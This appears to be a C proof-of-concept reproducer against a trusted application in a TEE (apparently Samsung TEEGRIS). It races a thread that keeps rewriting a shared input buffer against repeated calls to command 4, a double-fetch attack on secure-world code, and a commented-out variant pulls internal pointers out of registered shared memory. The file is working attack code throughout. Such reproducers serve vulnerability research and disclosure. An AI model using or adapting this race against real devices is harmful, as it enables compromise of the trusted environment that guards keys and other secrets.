#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>     
#include <pthread.h>
#include <sys/mman.h>   
#include <sys/types.h>  
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
TEEC_Result (*TEEC_AllocateSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(){
#if EMULATE
	system("ipcrm -M 0x13337");
	system("ipcrm -M 0x13338");
	system("ipcrm -M 0x13339");
	system("ipcrm -M 0x1333a");
#endif
}

typedef struct bs{
    int* buf0;
    int* buf1;
} bs;

int start = 0;

void* mod_thread(void* arrg){
    bs* bsss = (bs*) arrg;
    int* arg = bsss->buf0;
    int* arg2 = bsss->buf1;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(1, &set);
    puts("mod thread straing");
    while(1){
        if(start) break;
    }
    while(1){
        *(int*)arg = 9;
        *(int*)arg = 0;
    }
}

typedef struct pls{
    uint64_t a[3];
    uint64_t ptr;
}pls;

void send_req(TEEC_Context *context, TEEC_Session *session)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);

    uint32_t err_origin;
    TEEC_Result res; 
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
        #define buf_size 0x10 

    void* mem_area1 = allocate_param_mem(context, 0x1000);
    void* mem_area2 = allocate_param_mem(context, 0x1000);
    memset(mem_area1, 0, 0x1000);
    ((char*)mem_area1)[0] = '\t';

/*
#ifndef EMULATE 
    TEEC_SharedMemory in_mem;
    in_mem.buffer = mem_area1;
    in_mem.size = buf_size;
    in_mem.flags = TEEC_MEM_INPUT; // | TEEC_MEM_OUTPUT;
    res = TEEC_RegisterSharedMemory_impl(context, &in_mem);
    if (res != TEEC_SUCCESS) {
        printf("Failed to register shared memory 1 %d\n", res);
        exit(-1);
    }
    pls* wow = (pls*)&in_mem;
    pls* wow2 = (pls*)wow->ptr;
    void* shm = (void*)wow2->ptr;
    printf("shm ptr %p\n", shm);
    op.params[0].memref.parent = &in_mem;  // the keyblock buffer

    pthread_t tid;
    bs someshit;
    someshit.buf0 = (int*)mem_area1;
    someshit.buf1 = (int*)mem_area1;
    if (pthread_create(&tid, NULL, mod_thread, &someshit) != 0) {
        perror("pthread_create failed");
        return;
    }
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_WHOLE, TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
    

#else
*/
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
    
 
    op.params[0].tmpref.buffer = mem_area1;  // the keyblock buffer
    op.params[0].tmpref.size =  buf_size; 
    op.params[1].tmpref.buffer = mem_area2;  // the keyblock buffer
    op.params[1].tmpref.size =  0x1000; 

    pthread_t tid;
    bs someshit;
    someshit.buf0 = mem_area1;
    someshit.buf1 = mem_area1;
    
    if (pthread_create(&tid, NULL, mod_thread, &someshit) != 0) {
        perror("pthread_create failed");
        return;
    }
    *(int*)mem_area1 = 0x112;
    start = 1;
    for(int i=0; i<100000; i++){
        printf("??? %d\n", *(int*)mem_area1);
    } 
//#endif
    while(1){
        res = TEEC_InvokeCommand_impl(session, 4, &op, &err_origin);
        printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
    }
}


int main(int argc, char **argv)
{
    char* ta = "A985D3EB-3B52-4D44-BE6C-628A813561E8";
    TEEC_UUID *uuid = teegris_uuid(ta); 

    uint32_t err_origin;
    TEEC_Result res;
	TEEC_Context context;
    TEEC_Session session;

	cleanup_shm();
    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    send_req(&context, &session);
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
